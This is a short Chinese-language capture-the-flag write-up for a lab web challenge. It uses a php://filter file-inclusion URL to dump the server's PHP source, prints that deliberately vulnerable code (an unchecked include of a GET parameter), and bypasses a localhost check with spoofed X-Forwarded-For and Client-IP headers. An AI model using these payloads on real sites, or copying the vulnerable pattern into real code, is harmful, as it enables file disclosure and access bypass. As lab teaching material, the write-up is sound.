**Easy-php**
---
From: [http://sqlab.zongyuan.nctu.me:8000/challenges#easy_php](http://sqlab.zongyuan.nctu.me:8000/challenges#easy_php)  
Question: [http://sqlab.chtsai.nctu.me/index.php?page=](http://sqlab.chtsai.nctu.me/index.php?page=)     
___
用   **Burp** 攔截網頁的封包

先使用PHP的Filter試著去讀取網頁背後的原始碼

    http://sqlab.chtsai.nctu.me/index.php?page=php://filter/read=convert.base64-encode/resource=./index.php

![php://filter/read=convert.base64-encode/resource=./xxe.php](https://github.com/liuchy0427/CTF-wrtieups/blob/master/web/NTHU-balqs/easy-php/file/%E6%93%B7%E5%8F%96.PNG)

會得到以下的結果

![](https://github.com/liuchy0427/CTF-wrtieups/blob/master/web/NTHU-balqs/easy-php/file/burp.PNG)

再將右邊的亂碼去做base64 decoding 結果如下
```php
    <?php
        $flag = 'flagSWRvbnR3YW50eW91a25vdw==';
        $ip = $_SERVER["REMOTE_ADDR"];

        if(array_key_exists('HTTP_CLIENT_IP', $_SERVER) && array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) &&
            $_SERVER["HTTP_CLIENT_IP"]=='127.0.0.1' && $_SERVER["HTTP_X_FORWARDED_FOR"] =='127.0.0.1'){
            $content = file_get_contents($flag);
            echo($content);
            return;
        }

        if(array_key_exists("page", $_GET)){
            $page = $_GET['page'];
            if(strpos($page, $flag) !== false){
                return;
            }
            if($page != ''){
                echo($page.'    ');
                include($page);
            }else{
                echo('<h1 style="text-align: center">You are a bad hacker !!!</h1>');
            }
        }
        else{
            echo('<script>window.location.href = "./index.php?page="</script>');
        }
    ?>
```
透過對程式碼的觀察，可以發現只要滿足  
  
```    $_SERVER["HTTP_CLIENT_IP"]=='127.0.0.1' && $_SERVER["HTTP_X_FORWARDED_FOR"] =='127.0.0.1'```  

即可讓程式碼自動echo出我們要的Flag
  
因此我們要透過 Burp 在載入網頁時更改header，加上以下兩段:  
``` 
    X-Forwarded-For:127.0.0.1
    Client-IP:127.0.0.1 
```  
  
再次傳送封包，就可以得到我們要的:

     balqs{REm0TE_F1LE_1NcLUs10N}
